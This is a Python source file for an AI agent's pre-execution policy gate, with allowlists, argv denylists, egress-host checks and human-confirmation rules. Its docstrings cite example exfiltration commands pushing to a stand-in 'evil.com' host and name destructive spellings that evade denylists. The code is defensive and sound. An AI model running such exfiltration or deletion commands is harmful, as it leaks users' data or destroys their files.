"""Warden — pre-execution policy enforcement for tool calls.

Where SenseGate verifies *what happened* after a turn (best-effort LLM
judge), Warden authorizes *what may happen* before it does (deterministic
gate). Different stage, different guarantee.

Composition: a Warden holds an ordered list of Policy objects. Each
policy returns Allow / Deny / RequireConfirmation. First non-allow wins.
Allow-by-default — an empty Warden imposes no constraints.

This module ships four starter policies:

  AllowlistPolicy          — restrict a tool's input to a set of values
  CommandAllowlistPolicy   — argv[0]-basename allowlist for run_command
  CostCeilingPolicy        — deny tools once daily USD spend exceeds budget
  QuietHoursPolicy         — deny tools during a local-time window
  ArgvValidatorPolicy      — deny argv patterns for run_command
  UrlAllowlistPolicy       — deny egress to non-allowlisted hosts in argv
  RequireConfirmationPolicy — gate egress/sensitive actions on human approval

The starter set is opinionated for personal-AI use. Custom policies just
need to satisfy the Policy protocol.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Literal, Protocol


# ---------------------------------------------------------------------------
# Core types
# ---------------------------------------------------------------------------


Verdict = Literal["allow", "deny", "require_confirmation"]


@dataclass
class PolicyDecision:
    verdict: Verdict
    reason: str = ""
    policy_name: str = ""


@dataclass
class PolicyContext:
    """What a policy gets to inspect before deciding."""

    tool_name: str
    tool_input: dict
    session_id: str = "default"
    now_utc: datetime | None = None


class Policy(Protocol):
    name: str

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision: ...


@dataclass
class AuditEntry:
    at: datetime
    tool_name: str
    verdict: Verdict
    reason: str
    policy_name: str


# ---------------------------------------------------------------------------
# Warden
# ---------------------------------------------------------------------------


class Warden:
    """Authorizes tool calls against a stack of policies.

    Behaviour:
      - Policies evaluated in order; first non-allow verdict wins.
      - Empty policy list = allow everything (no-op Warden).
      - Every decision (including allows) goes to `audit_log` for later
        inspection.
    """

    def __init__(self, policies: list[Policy] | None = None):
        self.policies: list[Policy] = list(policies) if policies else []
        self.audit_log: list[AuditEntry] = []

    def add(self, policy: Policy) -> "Warden":
        self.policies.append(policy)
        return self

    async def authorize(self, ctx: PolicyContext) -> PolicyDecision:
        for policy in self.policies:
            decision = await policy.evaluate(ctx)
            if decision.verdict != "allow":
                self._record(ctx, decision)
                return decision
        decision = PolicyDecision(verdict="allow", policy_name="warden:default")
        self._record(ctx, decision)
        return decision

    def _record(self, ctx: PolicyContext, decision: PolicyDecision) -> None:
        self.audit_log.append(
            AuditEntry(
                at=ctx.now_utc or datetime.now(timezone.utc),
                tool_name=ctx.tool_name,
                verdict=decision.verdict,
                reason=decision.reason,
                policy_name=decision.policy_name,
            )
        )


# ---------------------------------------------------------------------------
# Starter policies
# ---------------------------------------------------------------------------


@dataclass
class AllowlistPolicy:
    """Generic single-tool allowlist on one input field.

    Example: AllowlistPolicy("send_email", field="to", allowed={"me@x.com"})
    denies email tool calls whose `to` is not in the allowed set.
    """

    tool_name: str
    field: str
    allowed: set[str]
    name: str = "allowlist"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if ctx.tool_name != self.tool_name:
            return PolicyDecision("allow", policy_name=self.name)
        value = ctx.tool_input.get(self.field)
        if value is None or str(value) in self.allowed:
            return PolicyDecision("allow", policy_name=self.name)
        return PolicyDecision(
            "deny",
            reason=f"'{self.field}={value}' not in allowlist for {self.tool_name}",
            policy_name=self.name,
        )


@dataclass
class CommandAllowlistPolicy:
    """argv[0]-basename allowlist for run_command (or any argv-shaped tool).

    Matches Path(argv[0]).name against `allowed`. Skipped for any other
    tool. Note: ambi/run_command.py's CommandPolicy already enforces this
    inside the tool — Warden adds this for defense-in-depth or if you
    want the deny decision visible in the Warden audit log.
    """

    allowed: set[str]
    tool_name: str = "run_command"
    name: str = "command_allowlist"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if ctx.tool_name != self.tool_name:
            return PolicyDecision("allow", policy_name=self.name)
        argv = ctx.tool_input.get("argv")
        if not isinstance(argv, list) or not argv:
            # Malformed input — let the tool's own validation reject it.
            return PolicyDecision("allow", policy_name=self.name)
        cmd = Path(str(argv[0])).name
        if cmd in self.allowed:
            return PolicyDecision("allow", policy_name=self.name)
        return PolicyDecision(
            "deny",
            reason=f"command '{cmd}' not in allowlist",
            policy_name=self.name,
        )


def _is_subsequence(needle: list[str], hay: list[str]) -> bool:
    """True if every token of `needle` appears in `hay` in order (gaps allowed)."""
    if not needle:
        return False
    it = iter(hay)
    return all(tok in it for tok in needle)


@dataclass
class ArgvValidatorPolicy:
    """Forbid specific argv patterns for run_command-shaped tools.

    A pattern matches if EITHER:
      - it appears as a substring of the space-joined argv, OR
      - its whitespace-split tokens appear as an ordered subsequence of the
        argv tokens (so `git --no-pager push --force` still trips
        "git push --force", and extra whitespace can't evade it).

    Matching is case-insensitive. Still a denylist — coarse and bypassable by
    equivalent spellings (`rm -fr`, `find -delete`); pair it with the argv[0]
    allowlist (the real gate) and UrlAllowlistPolicy for egress.
    """

    forbid: list[str]
    tool_name: str = "run_command"
    name: str = "argv_validator"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if ctx.tool_name != self.tool_name:
            return PolicyDecision("allow", policy_name=self.name)
        argv = ctx.tool_input.get("argv")
        if not isinstance(argv, list):
            return PolicyDecision("allow", policy_name=self.name)
        tokens = [str(a).lower() for a in argv]
        joined = " ".join(tokens)
        for pattern in self.forbid:
            pat = pattern.lower()
            if pat in joined or _is_subsequence(pat.split(), tokens):
                return PolicyDecision(
                    "deny",
                    reason=f"argv contains forbidden pattern: {pattern!r}",
                    policy_name=self.name,
                )
        return PolicyDecision("allow", policy_name=self.name)


# URL host extraction: scheme://[user@]host[:port]/… and scp-style user@host:path.
_URL_HOST_RE = re.compile(r"[a-zA-Z][a-zA-Z0-9+.\-]*://(?:[^/@\s]+@)?([^/:\s]+)")
_SCP_HOST_RE = re.compile(r"(?:^|[\s])[\w.\-]+@([\w.\-]+):")


def _extract_hosts(text: str) -> set[str]:
    hosts = {m.group(1).lower() for m in _URL_HOST_RE.finditer(text)}
    hosts |= {m.group(1).lower() for m in _SCP_HOST_RE.finditer(text)}
    return hosts


@dataclass
class UrlAllowlistPolicy:
    """Restrict outbound URLs/remotes in run_command argv to allowed hosts.

    Scans every argv token for URL-like or scp-like targets (e.g.
    `git push https://evil.com/r`, `git remote add x git@evil.com:r`). Any
    host that is not an allowed host (or a subdomain of one) trips the policy.
    Defaults to a hard `deny` — pushing to an arbitrary host is essentially
    never a legitimate request and is the classic injection exfil channel.

    A subdomain of an allowed host is allowed (gist.github.com ⊂ github.com).
    """

    allowed_hosts: set[str]
    tool_name: str = "run_command"
    verdict_on_block: Verdict = "deny"
    name: str = "url_allowlist"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if ctx.tool_name != self.tool_name:
            return PolicyDecision("allow", policy_name=self.name)
        argv = ctx.tool_input.get("argv")
        if not isinstance(argv, list):
            return PolicyDecision("allow", policy_name=self.name)
        hosts: set[str] = set()
        for tok in argv:
            hosts |= _extract_hosts(str(tok))
        blocked = sorted(h for h in hosts if not self._allowed(h))
        if blocked:
            return PolicyDecision(
                self.verdict_on_block,
                reason=f"egress to non-allowlisted host(s): {blocked}",
                policy_name=self.name,
            )
        return PolicyDecision("allow", policy_name=self.name)

    def _allowed(self, host: str) -> bool:
        host = host.lower()
        return any(
            host == a.lower() or host.endswith("." + a.lower())
            for a in self.allowed_hosts
        )


@dataclass
class RequireConfirmationPolicy:
    """Force human confirmation for sensitive / egress actions.

    Returns ``require_confirmation`` (not ``deny``) so an interactive
    confirmer can approve the call. Crucially, the agent loop fails closed:
    if no confirmer is wired (e.g. a headless daemon), an unconfirmed call is
    declined, not executed. This is the structural cap on injection blast
    radius — a hijacked model still can't exfiltrate or act outbound without
    passing this gate.

    Two match modes (either triggers):
      - ``tools``: confirm any call to these tool names outright (e.g. an
        email/Telegram send tool, an MCP write tool).
      - ``argv_patterns``: confirm a run_command-shaped call whose space-joined
        argv contains any of these substrings (e.g. "git push").
    """

    tools: set[str] = field(default_factory=set)
    argv_patterns: list[str] = field(default_factory=list)
    command_tool: str = "run_command"
    name: str = "require_confirmation"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if ctx.tool_name in self.tools:
            return PolicyDecision(
                "require_confirmation",
                reason=f"'{ctx.tool_name}' is a sensitive action",
                policy_name=self.name,
            )
        if ctx.tool_name == self.command_tool and self.argv_patterns:
            argv = ctx.tool_input.get("argv")
            if isinstance(argv, list):
                joined = " ".join(str(a) for a in argv)
                for pattern in self.argv_patterns:
                    if pattern in joined:
                        return PolicyDecision(
                            "require_confirmation",
                            reason=f"egress: argv contains {pattern!r}",
                            policy_name=self.name,
                        )
        return PolicyDecision("allow", policy_name=self.name)


@dataclass
class CostCeilingPolicy:
    """Deny tool calls once today's LLM spend has exceeded `daily_usd`.

    Coarse but effective: blocking tools stops the agent from compounding
    cost via further tool-driven turns. The model can still respond with
    text — it just can't act further until the budget rolls over.
    """

    usage_store: object  # UsageStore — typed loosely to avoid cycle
    daily_usd: float
    name: str = "cost_ceiling"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        now = ctx.now_utc or datetime.now(timezone.utc)
        since = now.replace(hour=0, minute=0, second=0, microsecond=0)
        try:
            summary = await self.usage_store.summary(since=since)
        except Exception:
            return PolicyDecision("allow", policy_name=self.name)
        if summary.cost_usd >= self.daily_usd:
            return PolicyDecision(
                "deny",
                reason=(
                    f"daily spend ${summary.cost_usd:.4f} >= ceiling "
                    f"${self.daily_usd:.4f}"
                ),
                policy_name=self.name,
            )
        return PolicyDecision("allow", policy_name=self.name)


@dataclass
class QuietHoursPolicy:
    """Deny tool calls during a quiet-hours window in the local timezone.

    Useful for the scheduler — keep the agent from firing reminders at
    3am. Hours are integers 0–23. Window wraps midnight automatically
    when `start_hour > end_hour` (e.g. 22, 7 = 10pm–7am quiet).
    `tools=None` applies to every tool; pass a set to scope.
    """

    start_hour: int
    end_hour: int
    tools: set[str] | None = None
    name: str = "quiet_hours"

    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
        if self.tools is not None and ctx.tool_name not in self.tools:
            return PolicyDecision("allow", policy_name=self.name)
        now = ctx.now_utc or datetime.now(timezone.utc)
        local_hour = now.astimezone().hour
        if self.start_hour > self.end_hour:
            in_quiet = local_hour >= self.start_hour or local_hour < self.end_hour
        else:
            in_quiet = self.start_hour <= local_hour < self.end_hour
        if in_quiet:
            return PolicyDecision(
                "deny",
                reason=(
                    f"quiet hours {self.start_hour:02d}:00–"
                    f"{self.end_hour:02d}:00 (local hour {local_hour:02d})"
                ),
                policy_name=self.name,
            )
        return PolicyDecision("allow", policy_name=self.name)
